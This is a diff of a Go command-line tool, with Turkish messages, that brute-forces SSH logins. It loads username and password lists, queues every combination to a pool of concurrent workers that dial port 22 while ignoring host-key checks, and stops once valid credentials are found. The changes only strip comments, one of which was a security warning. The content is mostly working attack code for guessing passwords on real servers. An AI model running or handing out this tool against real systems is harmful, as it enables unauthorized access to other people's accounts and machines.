@@ -113,7 +113,6 @@ func parseArgs() (*Config, error) {
 		}
 	}
 
-	// Gerekli parametrelerin olup olmadığını kontrol et
 	if config.Host == "" {
 		return nil, fmt.Errorf("hata: -h parametresi zorunludur")
 	}
@@ -124,7 +123,6 @@ func parseArgs() (*Config, error) {
 		return nil, fmt.Errorf("hata: Şifre için -p veya -P parametresinden biri gereklidir")
 	}
 
-	// Kullanıcı adlarını dosyadan yükle
 	if userFile != "" {
 		users, err := readLines(userFile)
 		if err != nil {
@@ -133,7 +131,6 @@ func parseArgs() (*Config, error) {
 		config.Usernames = append(config.Usernames, users...)
 	}
 
-	// Şifreleri dosyadan yükle
 	if passFile != "" {
 		passwords, err := readLines(passFile)
 		if err != nil {
@@ -145,24 +142,21 @@ func parseArgs() (*Config, error) {
 	return config, nil
 }
 
-// SSH Denemesi İçin Kullanılacak Yapı
 type SSHAttempt struct {
 	User string
 	Pass string
 }
 
-// SSH Bağlantısını Test Eden Fonksiyon
 func trySSH(host, user, pass string) bool {
 	config := &ssh.ClientConfig{
 		User: user,
 		Auth: []ssh.AuthMethod{
 			ssh.Password(pass),
 		},
-		HostKeyCallback: ssh.InsecureIgnoreHostKey(), // Güvenlik nedeniyle dikkat edilmeli
+		HostKeyCallback: ssh.InsecureIgnoreHostKey(),
 		Timeout:         5 * time.Second,
 	}
 
-	// SSH Bağlantısını Açmayı Dene
 	address := fmt.Sprintf("%s:22", host)
 	conn, err := ssh.Dial("tcp", address, config)
 	if err != nil {
@@ -175,7 +169,6 @@ func trySSH(host, user, pass string) bool {
 	return true
 }
 
-// Worker Pool Mekanizması
 func worker(host string, jobs <-chan SSHAttempt, results chan<- bool, wg *sync.WaitGroup) {
 	defer wg.Done()
 	for attempt := range jobs {
@@ -186,19 +179,16 @@ func worker(host string, jobs <-chan SSHAttempt, results chan<- bool, wg *sync.W
 	}
 }
 
-// Worker Pool Başlatan Fonksiyon
 func bruteForce(config *Config, numWorkers int) {
 	jobs := make(chan SSHAttempt, len(config.Usernames)*len(config.Passwords))
 	results := make(chan bool)
 	var wg sync.WaitGroup
 
-	// Workerları başlat
 	for i := 0; i < numWorkers; i++ {
 		wg.Add(1)
 		go worker(config.Host, jobs, results, &wg)
 	}
 
-	// Tüm kombinasyonları iş kuyruğuna ekle
 	go func() {
 		for _, user := range config.Usernames {
 			for _, pass := range config.Passwords {
@@ -208,13 +198,11 @@ func bruteForce(config *Config, numWorkers int) {
 		close(jobs)
 	}()
 
-	// İşlemi kontrol et
 	go func() {
 		wg.Wait()
 		close(results)
 	}()
 
-	// İlk başarılı girişte işlemi durdur
 	for res := range results {
 		if res {
 			fmt.Println("[+] Geçerli kimlik bilgileri bulundu, çıkılıyor...")
